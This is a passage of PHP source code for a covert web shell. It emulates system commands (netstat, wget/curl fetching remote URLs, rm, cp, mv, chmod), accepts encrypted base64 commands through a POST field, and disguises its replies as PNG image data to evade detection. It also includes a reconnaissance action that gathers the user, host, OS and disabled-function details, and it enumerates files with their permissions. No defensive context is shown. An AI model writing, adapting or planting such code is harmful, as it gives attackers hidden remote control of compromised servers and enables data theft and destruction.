        case 'netstat':
            $o="Proto Local              Foreign            State\n";$tc=@file_get_contents('/proc/net/tcp');
            if($tc){$ls=explode("\n",trim($tc));array_shift($ls);
                $sts=['01'=>'ESTABLISHED','02'=>'SYN_SENT','03'=>'SYN_RECV','06'=>'TIME_WAIT','0A'=>'LISTEN'];
                foreach(array_slice($ls,0,30)as$l){$p=preg_split('/\s+/',trim($l));if(count($p)<4)continue;
                    $s=$sts[strtoupper($p[3])]??$p[3];$o.=sprintf("tcp   %-18s %-18s %s\n",_ha($p[1]),_ha($p[2]),$s);}}
            return rtrim($o);
        case 'wget':case 'curl':
            $url=$arg;if(preg_match('/(https?:\/\/\S+)/',$arg,$m))$url=$m[1];
            $c=@file_get_contents($url);return $c!==false?$c:"$bin: failed";
        case 'touch':$f=trim($arg);return(@file_put_contents($f,@file_get_contents($f)?:'')!==false)?'':"touch: error";
        case 'mkdir':$f=trim(str_replace('-p ','',$arg));return@mkdir($f,0755,true)?'':"mkdir: error";
        case 'rm':$f=trim(preg_replace('/^-\S+\s+/','',$arg));return@unlink($f)?'':"rm: error";
        case 'cp':if(preg_match('/^(\S+)\s+(\S+)/',$arg,$m))return@copy($m[1],$m[2])?'':"cp: error";return"Usage: cp src dest";
        case 'mv':if(preg_match('/^(\S+)\s+(\S+)/',$arg,$m))return@rename($m[1],$m[2])?'':"mv: error";return"Usage: mv src dest";
        case 'chmod':if(preg_match('/^(\d+)\s+(\S+)/',$arg,$m))return@chmod($m[2],octdec($m[1]))?'':"chmod: error";return"Usage: chmod mode file";
        default:return false;
    }
}
function _ha($h){$p=explode(':',$h);$ip=long2ip(hexdec(implode('',array_reverse(str_split($p[0],2)))));return $ip.':'.hexdec($p[1]);}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['p_load'])) {
    while (@ob_get_level()) { @ob_end_clean(); }
    header('Content-Type: image/png');

    $raw = @base64_decode($_POST['p_load']);
    $dec = ($raw !== false && strlen($raw) >= 33) ? px_d($raw, $_mk) : false;
    $req = ($dec !== false) ? @json_decode($dec, true) : null;
    if (!is_array($req)) {
        $enc = px_e(json_encode(['r' => 'AUTH_FAIL']), $_mk);
        die($png_sig . base64_encode($enc));
    }

    $a = $req['a'] ?? '';
    $p = $req['p'] ?? getcwd();
    $r = "OK";

    switch ($a) {
        case 'recon':
            $df = @ini_get('disable_functions');
            $r = ['u' => @get_current_user(), 'h' => php_uname('n'), 's' => php_uname('s').' '.php_uname('r').' '.php_uname('m'), 'v' => PHP_VERSION, 'm' => ini_get('post_max_size'), 'df' => $df ? $df : 'none'];
            break;
        case 'ls':
            $dir = str_replace('\\', '/', realpath($p));
            $files = @scandir($dir); $d_l = []; $f_l = [];
            if ($files) {
                foreach($files as $f) {
                    if($f == '.' || $f == '..') continue;
                    $fp = $dir.'/'.$f;
                    $info = ['n'=>$f, 't'=>is_dir($fp)?'d':'f', 'p'=>$fp, 's'=>is_dir($fp)?'--':@filesize($fp), 'w'=>is_writable($fp)?'Y':'N', 'pm'=>substr(sprintf('%o', @fileperms($fp)), -4), 'mt'=>@date('Y-m-d H:i', filemtime($fp))];
                    if (is_dir($fp)) $d_l[] = $info; else $f_l[] = $info;
